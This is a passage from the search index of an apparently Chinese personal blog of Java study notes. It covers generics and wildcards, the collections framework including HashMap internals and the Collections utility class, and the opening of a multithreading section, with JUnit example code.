","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/:0:3","tags":["Java","泛型"],"title":"Java学习之泛型","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/"},{"categories":["Java学习"],"content":"泛型在继承上的体现 类A是类B的父类，G\u003cA\u003e和G\u003cB\u003e不具备子父类关系，二者是并列关系 补充：类A是类B的父类/接口，A\u003cG\u003e与\u003cG\u003e也具备子父类/接口关系 package cn.xpshuai.java2; import org.junit.Test; import java.util.ArrayList; import java.util.List; /** * @author: 剑胆琴心 * @create: 2021-01-28 15:38 * @功能： * * 1.泛型在继承方面的体现 * * * 2.通配符的使用 * * * * */ public class GenericTest { /* 1.泛型在继承方面的体现 类A是类B的父类，G\u003cA\u003e和G\u003cB\u003e不具备子父类关系，二者是并列关系 补充：类A是类B的父类/接口，A\u003cG\u003e与\u003cG\u003e也具备子父类/接口关系 */ @Test public void test(){ //在类上的展示, 类似多态的展示 Object obj = null; String str = null; obj = str; //在数组上的展示 Object[] arr1 = null; String[] arr2 = null; arr1 = arr2; // 编译不通过 List\u003cObject\u003e l1 = null; List\u003cString\u003e l2 = null; //此时的l1和l2的类型不具有子父关系 // l1 = l2; //错误 } @Test public void test1(){ List\u003cString\u003e list1 = null; ArrayList\u003cString\u003e list2 = null; list1 = list2; } } ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/:0:4","tags":["Java","泛型"],"title":"Java学习之泛型","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/"},{"categories":["Java学习"],"content":"通配符的使用 package cn.xpshuai.java2; import org.junit.Test; import java.util.ArrayList; import java.util.Iterator; import java.util.List; /** * @author: 剑胆琴心 * @create: 2021-01-28 15:38 * @功能： * * 1.泛型在继承方面的体现 * * * 2.通配符的使用 * */ public class GenericTest { /* 1.泛型在继承方面的体现 类A是类B的父类，G\u003cA\u003e和G\u003cB\u003e不具备子父类关系，二者是并列关系 补充：类A是类B的父类/接口，A\u003cG\u003e与\u003cG\u003e也具备子父类/接口关系 */ @Test public void test(){ //在类上的展示, 类似多态的展示 Object obj = null; String str = null; obj = str; //在数组上的展示 Object[] arr1 = null; String[] arr2 = null; arr1 = arr2; // 编译不通过 List\u003cObject\u003e l1 = null; List\u003cString\u003e l2 = null; //此时的l1和l2的类型不具有子父关系 // l1 = l2; //错误 } @Test public void test1(){ List\u003cString\u003e list1 = null; ArrayList\u003cString\u003e list2 = null; list1 = list2; } /* 2.通配符的使用 通配符：? 类A是类B的父类，且G\u003cA\u003e和G\u003cB\u003e不具备子父类关系，二共同的父类是: G\u003c?\u003e */ @Test public void test2(){ List\u003cObject\u003e l1 = null; List\u003cString\u003e l2 = null; List\u003c?\u003e list = null; //作为前两个的公共父类,实现公共的调用 list = l1; list = l2; printer(l1); printer(l2); // List\u003cString\u003e list3 = new ArrayList\u003c\u003e(); list3.add(\"AA\"); list3.add(\"BB\"); list3.add(\"CC\"); list = list3; //添加(写入)：对于List\u003c?\u003e，就不能向其内部添加数据了 //除了添加null之外, 仅此而已 // list.add(\"D\"); list.add(null); //获取(读取):允许读取数据，读取的数据类型为Object Object o = list.get(0); System.out.println(o); // 但是是允许读的 } // 加上通配符，这样就可以调用一个公共的方法了 public void printer(List\u003c?\u003e list){ Iterator\u003c?\u003e iterator = list.iterator(); while (iterator.hasNext()){ Object obj = iterator.next(); System.out.println(obj); } } } 有限制条件的通配符的使用： /* 3.有限制条件的通配符的使用 ? extends A: G\u003c? extends A\u003e 可以作为G\u003cA\u003e和G\u003cB\u003e的父类，其中B是A的子类 ? super A: G\u003c? super A\u003e 可以作为G\u003cA\u003e和G\u003cB\u003e的父类, 其中G\u003cB\u003e为A的父类 */ @Test public void test3(){ //以List为例 List\u003c? extends Person\u003e l1 = null; // \u003c= List\u003c? super Person\u003e l2 = null; // \u003e= List\u003cStudents\u003e l3 = null; List\u003cPerson\u003e l4 = null; List\u003cObject\u003e l5 = null; l1 = l3; l1 = l4; // l1 = l5; // l2 = l3; l2 = l4; l2 = l5; } package cn.xpshuai.java2; public class Students extends Person{ } ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/:0:5","tags":["Java","泛型"],"title":"Java学习之泛型","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/"},{"categories":["Java学习"],"content":"泛型应用举例 泛型嵌套： list1.forEach(System.out::println) # jdk8新特性 ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/:0:6","tags":["Java","泛型"],"title":"Java学习之泛型","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B3%9B%E5%9E%8B/"},{"categories":["Java学习"],"content":" 这章很重要的哦 ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/:0:0","tags":["Java","集合","HashMap","List"],"title":"Java学习之集合","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/"},{"categories":["Java学习"],"content":"Java集合框架概述 为了方便对多个对象的操作，就需要对对象进行存储 且使用Array存储对象方面存在一定弊端。而Java集合就像一种容器，可以动态地把多个对象的引用放入容器 数组在内存存储方面的特点: 数组初始化以后，长度就确定了； 数组声明的类型，就决定了进行元素初始化时的类型。 数组在存储数据方面的弊端: 数组初始化以后，长度就不可变了，不便于扩展； 数组中提供的属性和方法少，不便于进行添加、删除、插入等操作，且效率不高。同时无法直接获取存储元素的个数； 数组存储的数据是有序的、可以重复的。—-\u003e存储数据的特点单一 Java集合可分为Collection和 Map 两种体系: Collection接口:单列数据，定义了存取一组对象的方法的集合 List: 元素有序、可重复的集合 Set: 元素无序、不可重复的集合 Map接口:双列数据，保存具有映射关系“key-value对”的集合 Java集合框架概述： /** *学完之后，最基本要知道，什么类型的数据适合用什么样的集合存储 * * 一、集合框架的概述 * 1.集合、数组都是对多个数据进行存储操作的结构，简称Java容器。 *此时的存储，主要指的是内存层面的存储，不涉及持久化的存储(.txt，jpg，avi，数据库...) * * 2.数组在存储多个数据方面的特点： * \u003e 一旦初始化，其长度就确定了 * \u003e 数组一旦定义好，其元素的类型也就确定了,如元素类型:String[] arr2; int[] arr1; Object[] arr2; * * 3.相比集合，数组在存储多个数据方面的特点： * \u003e 一旦初始化，其长度就确定了, 无法扩容 * \u003e 数组中提供的方法非常有限，对于添加删除插入元素的操作非常不方便，同时效率不高 * \u003e 获取数组中实际元素的个数，没有现成的属性或方法 * \u003e 数组存储数据的特点: 有序、可重复，对于无序、不可重复的需求不可满足 * * * 二、集合框架 * | ----- Collection接口: 单列数据，定义了存取一组对象的方法的集合 * |---- List接口(\"动态数据\"): 存储元素有序、可重复的数据 * |---- ArrayList、LinkedList、Vector(这三个面试多) * |---- Set接口(类似高中讲的\"集合\":无序、确定性、互异性): 存储元素元素无序、不可重复 * |---- HashSet、LinkedHashSet、TreeSet * | ----- Map接口: 双列数据，保存具有映射关系的\"key-value\"对的集合(类似高中函数: y = f(x)，不同key可以指向相同的value) * |---- HashMap(面试问得多)、LinkedHashMap、TreeMap、Hashtable、Properties * * * * */ ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/:0:1","tags":["Java","集合","HashMap","List"],"title":"Java学习之集合","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/"},{"categories":["Java学习"],"content":"Collection接口 单列数据，定义了存取一组对象的方法的集合 Collection接口的方法 /* *三、Collection接口中的方法 * * 结论： *向Collection接口的试下类的接口中添加数据obj时，要求boj所在类要重写equals() */ public class MyCollectionTest { /* Collection接口中的方法 */ @Test public void test1(){ //这里使用ArrayList用多态的方法来做的测试 Collection coll = new ArrayList(); // ArrayList 是有序的 //1.add(Object e): 将元素e添加到集合中 coll.add(\"AA\"); coll.add(\"BB\"); coll.add(123); //自动装箱 coll.add(new Date()); coll.add(new Person(\"Tom\", 20)); //2.size(): 获取添加的元素的个数 System.out.println(coll.size()); //3.addAll: 把另一集合中的元素添加到当前的集合中 Collection coll2 = new ArrayList(); coll.add(456); coll.add(\"CC\"); coll.addAll(coll2); System.out.println(coll); //4.isEmpty(): 判断当前集合是否为空(是否有元素, size是否为0) System.out.println(coll.isEmpty()); //5.clear():清空集合元素 coll2.clear(); System.out.println(coll2); //6.contains(Object obj): 判断当前集合是否包含obj, 判断的是内容而不是地址 //在判断时，会调用obj对象所在类的equals()，要求我们自己重写一下 boolean contains = coll.contains(123); System.out.println(contains); System.out.println(coll.contains(new String(\"Tom\"))); // true, 判断的是内容, 调用的equals方法 System.out.println(coll.contains(new Person(\"Tom\", 20))); // false, 但是如果我们重写了Person的equals方法，然后就可以按照自己的想法变为true了 // 7.containsAll(Collection coll): 判断形参中的所有元素是否都存在于当前集合中 // 跟contains的判断是相等的，都跟实现类中的equals()有关 Collection coll3 = Arrays.asList(123,456); coll.containsAll(coll3); // 8.remove(Object obj): 从集合中移除某个元素, 成功返回true // 仍然需要重写equals()方法，因为在移除之前需要判断元素是否在集合中 coll.remove(123); coll.remove(new Person(\"Tom\", 20)); // 在Person中需重写equals() // 9.removeAll(Collection coll4): 从当前集合中移除某个集合中的元素(差集) coll.removeAll(coll3); System.out.println(coll); // 10.retainAll(Collection coll4):返回布尔型的值，修改当前集合为两个集合的交集 Collection coll4 = Arrays.asList(132,789,123); coll.retainAll(coll4); // 11.equals(Object bj): 比较两个集合是否相等，依次逐个元素比较(这里ArrayList是有序的，所以顺序不一样也不行) System.out.println(coll.equals(coll3)); // 12.hashCode(): 返回当前对象的hash值 System.out.println(coll.hashCode()); // 13.集合 --\u003e 数组: toArray() Object[] arr = coll.toArray(); for (int i = 0; i \u003c arr.length; i++) { System.out.println(arr[i]); } // 14.数组 --\u003e 集合: 调用Arrays类的静态方法asList() List\u003cString\u003e li = Arrays.asList(new String[]{\"AA\", \"BB\", \"CC\"}); System.out.println(li); //Note: 使用时候注意 List arr1 = Arrays.asList(new int[]{111,222}); //这种写法会被当做一个元素 List arr2 = Arrays.asList(111,222); //直接写这就行 List arr3 = Arrays.asList(new Integer[]{111,222}); //或者用Integer System.out.println(arr1.size()); System.out.println(arr2.size()); System.out.println(arr3.size()); // 15.iterator: 返回Iterator接口的实例，用于遍历集合元素，下一部分来测试 } } lterator迭代器接口 lteralor对象称为迭代器(设计模式的一种)，主要用于遍历Collection集合中的元素。 GOF给迭代器模式的定义为:提供一种方法访问一个容器(container)对象中各个元素，而又不需暴露该对象的内部细节。迭代器模式，就是为容器而生。类似于“公交车上的售票员”、“火车上的乘务员”、“空姐”。 Collection接口继承了java.lang.lterable接口，该接口有一个iterator()方法，那么所有实现了Collection接口的集合类都有一个iterator()方法，用以返回一个实现了lterator接口的对象。 Iterator仅用于遍历集合，lterator木身并不提供承装对象的能力。如果需要创建lterator对象，则必须有一个被迭代的集合。 集合对象每次调用iterator()方法都得到一个全新的迭代器对象，默认游标都在集合的第一个元素之前。 Iterator迭代器接口remove()方法 Iterator iterator2 = coll.iterator(); while (iterator2.hasNext()){ Object obj = iterator2.next(); if(\"Tom\".equals(obj)){ iterator2.remove(); } } Note: lterator可以删除集合的元素，但是是遍历过程中通过迭代器对象的remove方法，不是集合对象的remove方法。 如果还未调用next)或在上一次调用next方法之后已经调用了remove方法，再调用remove都会报llegalStateException。 /* 集合元素的遍历操作，使用Iterator(迭代器接口) 1.内部的方法：hasNext()与next()配合去使用 2.每次调用iterator()，就会是一个全新的迭代器对象，指针永远指向开头 3.内部定义了remove(),可以在遍历的时候，删除集合中的元素。此方法不同于集合直接使用remove() 4.在调用next()之前，不要调用remove()；移除集合中某元素的操作, 不能写两次 */ @Test public void test2(){ Collection coll = new ArrayList(); coll.add(\"AA\"); coll.add(\"BB\"); coll.add(123); coll.add(new Date()); coll.add(new Person(\"Tom\", 20)); Iterator iterator = coll.iterator(); // 装东西的还是原来的集合，Iterator并不是容器，只是迭代器 // next() // System.out.println(iterator.next()); // 不推荐这么写 // for (int i = 0; i \u003c coll.size(); i++) { // System.out.println(iterator.next()); // } // 【推荐写法】: // hasNext() 与 next()配合 while (iterator.hasNext()){ // next(): 1.指针先下移；2.将下移以后集合位置上的元素返回 System.out.println(iterator.next()); } //错误写法1: // while (iterator.next() != null){ //这里先指针下移了，所以会跳着输出，且会出现NoSuchElementException ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/:0:2","tags":["Java","集合","HashMap","List"],"title":"Java学习之集合","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/"},{"categories":["Java学习"],"content":" Collection子接口一: List(重点) 元素有序、可重复的集合 看做\"动态数组\"，以后可以用这个来代替数组啦~ List接口概述： 鉴于Java中数组用来存储数据的局限性，我们通常使用List替代数组 List集合类中元素有序、且可重复，集合中的每个元素都有其对应的顺序索引。 List容器中的元素都对应一个整数型的序号记载其在容器中的位置，可以根据序号存取容器中的元素。 JDK API中List接口的实现类常用的有: ArrayList、LinkedList和Vector。 源码分析(自己看) List接口常用方法： 除去Collection这种的15个，还有下面几个 【总结：常用方法】 增：add(Object obj) 删：remove(int index) /remove(Object obj) 改：set(int index, Object ele) 查：get(int index) 插：add(index, Object ele) 长度：size() 遍历：1. Iterator迭代器 2. foreach 3. 普通的循环 如下： package cn.xpshuai.java1; import org.junit.Test; import java.util.*; /** * @author: 剑胆琴心 * @create: 2021-01-26 16:44 * @功能： Collection子接口一: List * * 一、list源码框架 * |---- List接口: 存储元素有序、可重复的数据 --\u003e \"动态\"数组，替换原有数组 * |---- ArrayList: 作为List接口的主要实现类(一般就用它):线程不安全的(但是用的时候一般都扔到synchronizedList()里面就线程安全了)，效率高：底层使用Object[]存储 * |----LinkedList: 其次使用的, 对于频繁的插入和删除操作，使用此类效率比ArrayList高，底层使用双向链表存储 * |----Vector: 作为List接口的古老实现类: 线程安全的，效率低：底层使用Object[] elemData存储 * * List常用的接口异同： * - ArrayList * - LinkedList * - Vector * 同：都实现了list接口，存储数据的特点相同：存储有序的、可重复的数据 * 不同： * * * 二、源码分析： * 1.ArrayList: * jdk7情况下: * ArrayList list = new ArrayList(); //底层创建了长度是10的Object[]数组elementData * list.add(123);//elementData[0]=new Integer(123); * ... * list.add(11);//list.add(11);//如果此次的添加导致底层elementData数组容量不够，则扩容。默认情况下，扩容为原来的容量的1.5倍, 同时需要将原有数组中的数据复制到新的数组中 * 结论：建议开发中使用带参的构造器: ArrayList list = new ArrayList(int capacity); * * jdk8下变化: * ArrayList coll1 = new ArrayList();//底层object[]elementData初始化为{}.并没有创建长度为10的数组 * 第一次调用add()时，才创建长度为10的数组 * 后续的添加和扩瞳操作与jdk7无异 * * 小结：jdk7中的ArrayList的对象的创建类似于单例的饿汉式，而jdk8中的ArrayList的对象的创建类似于单例的蓝汉式，节省了内存 * * * 2.LinkedList: *LinkedList coll2 = new LinkedList(); * * * 3.Vector: * * * * * 三、list接口中常用方法 * 除去Collection这种的15个，还有下面几个 * */ public class ListTest { @Test public void test1(){ ArrayList coll1 = new ArrayList(); LinkedList coll2 = new LinkedList(); Vector coll3 = new Vector(); } /* list接口中常用方法 除去Collection这种的15个，还有下面几个 【总结：常用方法】 增：add(Object obj) 删：remove(int index) /remove(Object obj) 改：set(int index, Object ele) 查：get(int index) 插：add(index, Object ele) 长度：size() 遍历：1. Iterator迭代器 2. foreach 3. 普通的循环 */ @Test public void test2(){ ArrayList l1 = new ArrayList(); //就以ArrayList为例 l1.add(132); l1.add(132); l1.add(\"aaa\"); l1.add(new Person(\"Lisa\", 18)); System.out.println(l1); // void add(int index, Object obj): 在指定位置插入元素 l1.add(2, \"BB\"); // boolean addAll():在index位置开始将ollention的元素插入 List a1 = Arrays.asList(1, 2, 3); l1.addAll(a1); System.out.println(l1.size()); // Object get(int index): 获取指定位置元素 System.out.println(l1.get(0)); // int indexOf(): 获取元素首次出现的位置，如果不存在返回-1 int index = l1.indexOf(132); System.out.println(index); // int lastIndexOf(): 获取元素末次出现的位置，如果不存在返回-1 System.out.println(l1.lastIndexOf(\"BB\")); // Object remove(int index): 移除指定index位置的元素，并返回此元素 Object b = l1.remove(0); System.out.println(b); System.out.println(l1); //Object set(int index, Object ele): 返回指定idnex位置的元素为ele l1.set(1, \"CCC\"); System.out.println(l1); // List subList(int fromIndex, int toIndex): 从集合中返回一个左闭右开的子集合 List l2 = l1.subList(1,6); // 不会对本身list造成影响 System.out.println(l2); // 遍历 // F1: Iterator迭代器 Iterator iterator = l1.iterator(); while (iterator.hasNext()){ System.out.println(iterator.next()); } // F2: foreach for(Object obj: l1){ System.out.println(obj); } // F3:普通for循环 for (int i = 0; i \u003c l1.size(); i++) { System.out.println(l1.get(i)); } } @Test public void test3(){ } } 面试题： 区分list中remove()方法 @Test public void test1() { List list = new ArrayList(); list.add(1); list.add(2); list.add(3); updateList(list); System.out.println(list); } public void updateList(List list){ // list.remove(2); // 这样remove的是索引为2的元素 list.remove(new Integer(2)); //这样通过封装类的方式, remove的是元素值为2的元素 } Collection子接口二:Set 元素无序、不可重复的集合 类似高中讲的\"集合\": 无序性、确定性、互异性 Set接口概述： Set接口是Collection的子接口，set接口没有提供额外的方法 Set集合不允许包含相同的元素，如果试把两个相同的元素加入同一个Set集合中，则添加操作失败。 Set判断两个对象是否相同不是使用==运算符，而是根据equals()方法 Set实现类之一: Hashset HashSet是 Set接口的典型实现，大多数时候使用Set集合时都使用这个实现类; HashSet 按Hash算法来存储集合中的元素，因此具有很好的存取、查找、删除性能。 HashSet具有以下特点: 不能保证元素的排列顺序 HashS","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/:0:3","tags":["Java","集合","HashMap","List"],"title":"Java学习之集合","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/"},{"categories":["Java学习"],"content":"Map接口(重点) 双列数据，保存具有映射关系的\"key-value\"对的集合 类似高中函数: y = f(x)，不同key可以指向相同的value Map接口继承树： Map结构的理解: 常见面试题： 谈谈你对HashMap中put/get方法的认识?如果了解再谈谈HashMap的扩容机制?默认大小是多少?什么是负载因子(或填充比)?什么是春吐临界值(或阈值、threshold)? HashMap源码中重要常量： Map中常用的方法: package cn.xpshuai.java1; import org.junit.Test; import java.util.*; /** * @author: 剑胆琴心 * @create: 2021-01-27 16:22 * @功能： * * *一、Map的结构体系 * | ----- Map接口: 双列数据，保存具有映射关系的\"key-value\"对的集合(类似高中函数: y = f(x)，不同key可以指向相同的value) * |---- HashMap(面试问的多, 平时也常用): 作为Map的主要实现类; 线程不安全的，效率高；存储null的key和value * |---- LinkedHashMap:保证在遍历map元素时，可以按照添加的循序实现遍历 * 原因：在原有的HashMap的基础上，添加了一堆指针，指向前一个和后一个元素 * 对于频繁的遍历操作，此类执行效率高于HashMap * |---- TreeMap: 保证按照添加的key-value进行排序，实现排序遍历(此时考虑key的自然排序和定制排序) * |---- Hashtable: 作为古老的实现类；线程安全的，效率低；不能存储null的key和value * |---- Properties: 常用来处理配置文件。key和value都是String类型 * * * HashMap的底层：数组+链表(jdk7及之前) * 数组+链表+红黑树(jdk8) * * *二、Map结构的理解 * Map中的key: 无序的、不可重复的，使用Set存储所有的key ---\u003e key所在的类要重写equaLs( )和hashcode() （以HashMap为例） * Map中的value：无序的、可重复的，使用Collection存储所有的value --\u003evaLue所在的类要重写equals() * 一个键值对：key-value构成了一个Entry对象 * Map中的Entry: 无序的、不可重复的，使用Set存储所有的entry * * *三、HashMap的底层实现原理 * jdk7为例： * HashMap map = new HashMap(); * 在实例化以后，底层创建了长度为16的以为数组Entry[] table * ... 可能已经执行了多次put ... * map.push(key1, value1); * 首先，计算key1所在类的hashCode()，计算key1的哈希值，此哈希值经过某种算法计算以后，得到在Entry数组中的存放位置 * 如果此位置上的数据为空，此时的key1-value1添加成功 ---\u003e 情况1 * 如果此位置上的数据不为空(此位置存在一个或多个数据(以链表形式存在)), 比较key1和已经存在的一个或多个数据的hash值： * 如果key1的hash值与已存在的数据的hash值都不相同，此时key1-value1添加成功 ---\u003e 情况1 * 如果key1的hash值与已存在的数据的某一个数据(key2-value2)的hash值都不相同，继续比较: 调用key1所在类的equals()方法，比较: * 如果equals()返回false:此时key1-value1添加成功 ---\u003e 情况3 * 如果equals()返回true:使用value1替换相同key的value2值， * key1-value1添加成功 * 补充：关于情况2和情况3: 此时key1-value1和原来的数据以链表的方式存储 * * 在不断的添加过程中，会涉及到扩容问题, 当超出临界值(且要存放的位置非空)时，扩容。默认的扩容方式为扩容到原来容量的2倍，并将原有数据复制过来 * * jdk8 相较于jdk7，在底层实现方面的不同； * 1.new HashMap()： 底层没有创建一个长度为16的数组 * 2.jdk8底层的数据是 Node[], 而非Entry[] * 3.首次调用put()方法时，底层创建长度为16的数组 * 4.jdk7底层结构只有：数组+链表, jdk8中底层结构:数组+链表+红黑树 * 当数组的某一个索引位置上的元素以链表形式存在的数据个数\u003e8 且当前数组的长度\u003e64时， * 此时此索引位置上所有数据改为红黑树存储 * * *HashMap源码分析: * jdk7 * jdk8 * * * DEFAULT_INITIAL_CAPACITY : HashMap的默认容量，16 * DEFAULT_LOAD_FACTOR: HashMap的默认加载因子:0.75 * threshold:扩容的临界值，=容量*填充因子:16* 0.75 =\u003e12 * TREEIFY_THRESHOLD: Bucket中链表长度大于该默认值，转化为红黑树:8 * MIN_TREEIFY_CAPACITY:桶中的Node被树化时最小的hash表容量:64 * * * * 面试题: * 1.HashMap的底层实现原理(重点) * 2.HashMap和Hashtable区别 * 3.CurrentHashMap与Hashtable区别 * * * * 四、LinkedHashMap的底层实现: * static class Entry\u003cK,V\u003e extends HashMap.Node\u003cK,V\u003e { * Entry\u003cK,V\u003e before, after; //能够记录添加的元素的先后顺序 * Entry(int hash, K key, V value, Node\u003cK,V\u003e next) { * super(hash, key, value, next); * } * } * * * * 五、Map中常用的方法 * * * 六、TreeMap * //向TreeMap中添加key-value，要求key必须是由同一个类创建的对象 * //因为要按照key进行排序:自然排序、定制排序 * * * */ public class MapTest { @Test public void test1(){ Map map = new HashMap(); // map = new HashMap(); map.put(null, 123); } @Test public void test2(){ HashMap map = new HashMap(); // map = new HashMap(); map.put(null, 123); } @Test public void test3(){ HashMap map = new HashMap(); map = new LinkedHashMap(); // 记录了添加的顺序 map.put(123, \"AA\"); map.put(124, \"BB\"); map.put(567, \"CC\"); System.out.println(map); // LinkedHashMap } /* Map中常用的方法 */ @Test public void tes4(){ // Object put(Object key, Object value):将制定键值对添加(修改)到当前map对象中 // void putAll(Map m): 将m中所有键值对存放到当前map中 // Object remove(Object key): 移除指定key的键值对，并返回value // void clear(): 清空当前map中的所有数据 HashMap map = new HashMap(); //put 添加 map.put(123, \"AA\"); map.put(\"BB\", \"222\"); map.put(567, \"CC\"); map.put(56, \"CCC\"); // put修改 map.put(56, \"566666\"); //putAll() HashMap map2 = new HashMap(); map2.put(1, \"AA\"); map2.put(2, \"AB\"); map.putAll(map2); //remove Object val = map.remove(\"BB\"); System.out.println(val); System.out.println(map); //clear // map.clear(); System.out.println(map.size()); //元素查询的操作: //object get(0bject key):获取指定key对应的vaLue System.out.println(map.get(45)); //boolean containsKey (object key):是否包含指定的key System.out.println(map.containsKey(45)); //boolean containsValue(object value):是否包含指定的value // int size()","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/:0:4","tags":["Java","集合","HashMap","List"],"title":"Java学习之集合","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/"},{"categories":["Java学习"],"content":"Collections工具类 Collections是一个操作Set、list和lMap等集合的工具类 Collections中提供了一系列静态的方法对集合元素进行排序、查询和修改等操作，还提供了对集合对象设置不可变、对集合对象实现同步控制等方法 排序操作:(均为static方法) reverse(List):反转List中元素的顺序 shuffle(List):对List集合元素进行随机排序 sort(List):根据元素的自然顺序对指定List集合元素按升序排序 sort(List，Comparator):根据指定的Comparator产生的顺序对List集合元素进行排序wap(List，int，int):将指定list集合中的i处元素和j处元素进行交换 Collections常用方法 查找、替换 Object max(Collection):根据元素的自然顺序，返回给定集合中的最大元素Object max(Collection，Comparator):根据Comparator指定的顺序，返回给定集合中的最大元素 oobject min(Collection) oObject min(Collection，Comparator) int frequency(Collection，Object):返回指定集合中指定元素的出现次数 void copy(List dest,List src):将src中的内容复制到dest中 boolean replaceAll(List list，Object oldVal，Object newVal):使用新值替换List对象的所有旧值 package cn.xpshuai.java1; import org.junit.Test; import java.util.ArrayList; import java.util.Arrays; import java.util.Collections; import java.util.List; /** * @author: 剑胆琴心 * @create: 2021-01-28 9:07 * @功能：Collections:操作Collection、Map的工具类 * * * 面试题:Collection 和Collections区别？ * * * * 常用方法： * reverse(List):反转List中元素的顺序 * shuffle(list):对List集合元素进行随机排序 * sort(List):根据元素的自然顺序对指定List集合元素按升序排序 * sort(List，Comparator):根据指定的Comparator产生的顺序对List集合元素进行排序 * swap(List， int，int):将指定list集合中的i处元素和j处元素进行交换 * object max(Collection):根据元素的自然顺序，返回给定集合中的最大元素 * object max(collection，Comparator):根据Comparator指定的顺序，返回给定集合中的最 * object min(collection) * object min(colLection，Comparator) * int frequency(collection，object):返回指定集合中指定元素的出现次数 * void copy(List dest,List src):将src中的内容复制到dest中 * boolean replaceAlL(List list，object oldval，object newVal):使用新值替换List对 * * * */ public class CollectionsTest { @Test public void test(){ List list = new ArrayList(); list.add(132); list.add(55); list.add(666); list.add(666); list.add(-8); list.add(100); list.add(99); Collections.reverse(list); System.out.println(list); // list也改变了顺序哦 Collections.shuffle(list); System.out.println(list); Collections.sort(list); Collections.swap(list, 1,2); //交换两个索引的位置 System.out.println(list); Collections.frequency(list,666); //出现次数 // copy(List dst, List src): 将src的内容复制到dst中 //易错点: dst的长度不能比src小 //错误写法 // List dst = new ArrayList(); // Collections.copy(dst, list); // System.out.println(dst); //比较标准的写法 List dst = Arrays.asList(new Object[list.size()]); // n个null Collections.copy(dst, list); System.out.println(dst); //synchronizedXXX()方法 //Collections类中提供了多个synchronizedXxx()方法，该方法可使将指定集合包装成线程同步的集合，从而可以解决多线程并发访问集合时的线程安全问题 ///返回的List1即为线程安全的List List list1 = Collections.synchronizedList(list); } } ","date":"2021-01-28","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/:0:5","tags":["Java","集合","HashMap","List"],"title":"Java学习之集合","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9B%86%E5%90%88/"},{"categories":["Java学习"],"content":"基本概念 JVM内存结构： 单核CPU和多核CPU的理解： 单核：其实是一种假的多线程。因为在一个时间单元内，也只能执行一个线程的任务。 多核：如果是多核的话，才能更好的发挥多线程的效率。（现在的服务器都是多核的) 一个Java应用程序java.exe，其实至少有三个线程：main()主线程，gc()垃圾回收线程，异常处理线程。当然如果发生异常，会影响主线程。 **并行：**多个CPU同时执行多个任务。比如:多个人同时做不同的事。 **并发：**一个CPU(采用时间片)同时执行多个任务。比如:秒杀、多个人做同一件事 使用多线程的优点： 提高应用程序的响应。对图形化界面更有意义，可增强用户体验。 提高计算机系统CPU的利用率 改善程序结构。将既长又复杂的进程分为多个线程，独立运行，利于理解和修改 何时需要多线程： 程序需要同时执行两个或多个任务。 程序需要实现一些需要等待的任务时，如用户输入、文件读写操作、网络操作、搜索等。 需要一些后台运行的程序时。 ","date":"2021-01-17","objectID":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/:0:1","tags":["Java","多线程"],"title":"Java学习之多线程","uri":"/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java学习"],"content":"线程的创建和使用 共四种：1.继承与Thread类；2.实现Runnable接口； 3.实现Callable接口； 4.线程池 Java语言的JVM允许程序运行多个线程，它通过java.lang.Thread类来体现。 Thread类的特性： 每个线程都是通过某个特定Thread对象的run()方法来完成操作的，经常把run()方法的主体称为线程体 通过该Thread对象的start()方法来启动这个线程，而非直接调用run() 方法1：继承于Thread类 步骤： 创建一个继承与Thraed的子类 重写Thread类的run()方法–\u003e将此线程要执行的操作写在该方法内 创建Thread类的子对象 通过此对象调用start()方法 例子：多线程遍历100以内所有偶数 package cn.xpshuai.java1; /** * @author: 剑胆琴心 * @create 2021-01-16 14:21 * 程序：指一段静态的代码 进程：正在运行的一个程序，是资源分配的单位，系统会为每个进程分配Wie不同的内存区域是动态的。 线程：调度和执行的单位，每个线程拥有独立的运行栈和程序计数器，线程切换的开销小 进程可以细化为线程，线程是一个陈旭内部的一条执行路径 多个线程操作共享的系统资源(进程中的方法区和堆)可能带来安全隐患。 【创建多线程】 【方式1】：继承Thread类 1.创建一个继承与Thraed的子类 2.重写Thread类的run()方法--\u003e将此线程要执行的操作写在该方法内 3.创建Thread类的子对象 4.通过此对象调用start()方法 例子：遍历100以内所有偶数 * */ public class MultiThreadsTest { public static void main(String[] args) { //3.创建Thread类的子对象 MyThread1 myThread1 = new MyThread1(); // alt + enter 自动创建对象 //4.通过此对象调用start()方法：(1)启动当前线程 (2)调用当前线程的run() myThread1.start(); // 问题1：不能通过直接调用run()的方式启动线程 // myThread1.run(); // 